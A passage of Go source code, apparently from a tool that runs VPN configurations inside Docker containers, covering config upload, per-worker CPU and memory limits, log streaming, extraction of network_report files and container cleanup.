		if tarJob, err := singleFileTar("job_config.json", []byte(jobCfg)); err == nil {
			_ = m.dockerClient.CopyToContainer(context.Background(), cid, "/app/work", tarJob, types.CopyToContainerOptions{})
		}
	}
	if tarIn, err := singleFileTar("input.txt", []byte(vpnConfig+"\n")); err == nil {
		_ = m.dockerClient.CopyToContainer(context.Background(), cid, "/app/work", tarIn, types.CopyToContainerOptions{})
	}
	return cid, nil
}

func (m *VPNContainerManager) resourceLimits() (int64, int64, int64) {
	numCPU := runtime.NumCPU()
	cpuPeriod := int64(100000)
	availCPU := float64(numCPU) * (100.0 - SYSTEM_RESERVED_CPU_PERCENT) / 100.0
	totalQuota := int64(availCPU * float64(cpuPeriod))
	poolSize := m.config.WorkerPoolSize
	if poolSize <= 0 {
		poolSize = DEFAULT_WORKER_POOL_SIZE
	}
	cpuQuota := totalQuota / int64(poolSize)
	vmStat, _ := mem.VirtualMemory()
	availMem := uint64(float64(vmStat.Total) * (100.0 - SYSTEM_RESERVED_MEM_PERCENT) / 100.0)
	memPer := int64(availMem / uint64(poolSize))
	return cpuQuota, cpuPeriod, memPer
}

func (m *VPNContainerManager) streamLogs(ctx context.Context, cid, cname string) {
	opts := container.LogsOptions{ShowStdout: true, ShowStderr: true, Follow: true, Timestamps: false}
	logs, err := m.dockerClient.ContainerLogs(ctx, cid, opts)
	if err != nil {
		return
	}
	defer logs.Close()
	sc := bufio.NewScanner(logs)
	sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	for sc.Scan() {
		select {
		case <-ctx.Done():
			return
		default:
			line := sc.Text()
			// Docker raw-логи имеют 8-байтовый заголовок
			if len(line) >= 8 && (line[0] == 1 || line[0] == 2) {
				line = line[8:]
			}
			fmt.Printf("  %s[%s]%s %s\n", ColorCyan, cname, ColorReset, strings.TrimSpace(line))
		}
	}
}

// extractReports вытаскивает network_report*.{json,txt} из /app/work.
func (m *VPNContainerManager) extractReports(cid, cname string) error {
	ctx := context.Background()
	reader, _, err := m.dockerClient.CopyFromContainer(ctx, cid, "/app/work")
	if err != nil {
		return fmt.Errorf("copy from container: %w", err)
	}
	defer reader.Close()

	tr := tar.NewReader(reader)
	found := false
	outDir := filepath.Join(m.config.OutputPath, cname)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return err
	}
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return fmt.Errorf("tar read: %w", err)
		}
		if hdr.Typeflag != tar.TypeReg {
			continue
		}
		base := filepath.Base(hdr.Name)
		low := strings.ToLower(base)
		if !strings.Contains(low, "network_report") {
			io.Copy(io.Discard, tr)
			continue
		}
		if !strings.HasSuffix(low, ".json") && !strings.HasSuffix(low, ".txt") {
			io.Copy(io.Discard, tr)
			continue
		}
		found = true
		out := filepath.Join(outDir, base)
		f, err := os.Create(out)
		if err != nil {
			io.Copy(io.Discard, tr)
			continue
		}
		_, err = io.Copy(f, tr)
		f.Close()
		if err != nil {
			logWarning(cname, fmt.Sprintf("write %s: %v", out, err))
		} else {
			logSuccess(cname, fmt.Sprintf("saved %s", base))
		}
	}
	if !found {
		logWarning(cname, "no network_report files found")
	}
	return nil
}

func (m *VPNContainerManager) removeContainer(cid string) {
	err := m.dockerClient.ContainerRemove(context.Background(), cid, container.RemoveOptions{Force: true})
	if err != nil && !strings.Contains(err.Error(), "No such container") {
		short := cid
		if len(short) > 12 {
			short = short[:12]
		}
		logWarning("CLEANUP", fmt.Sprintf("rm %s: %v", short, err))
	}
}

func (m *VPNContainerManager) Close() {
	if m.workerPool != nil {
		m.workerPool.Shutdown()
	}
	if m.resourceMonitor != nil {
		m.resourceMonitor.Stop()
	}
	if m.processedFile != nil {
		m.processedFile.Close()
	}
	if m.failedFile != nil {
		m.failedFile.Close()
	}
	if m.dockerClient != nil {
		m.dockerClient.Close()
	}
}

// ─── tar helpers ──────────────────────────────────────────────────────────

func singleFileTar(name string, data []byte) (*bytes.Buffer, error) {
	buf := new(bytes.Buffer)
	tw := tar.NewWriter(buf)
	hdr := &tar.Header{Name: name, Size: int64(len(data)), Mode: 0644}
	if err := tw.WriteHeader(hdr); err != nil {
		return nil, err
	}
	if _, err := tw.Write(data); err != nil {
		return nil, err
	}
	if err := tw.Close(); err != nil {
		return nil, err
	}
	return buf, nil
}